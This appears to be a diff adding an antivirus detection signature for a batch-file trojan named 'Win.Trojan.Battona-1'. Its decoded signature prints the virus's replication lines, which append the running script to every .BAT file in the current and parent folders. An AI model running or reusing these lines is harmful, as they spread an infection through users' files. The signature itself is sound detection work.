@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.Battona-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+FOR %%f IN (*.BAT ../*.BAT) DO COPY %%f+%0 %%f>nul
+copy /Y %0 +BlaCk1 BlaCk1
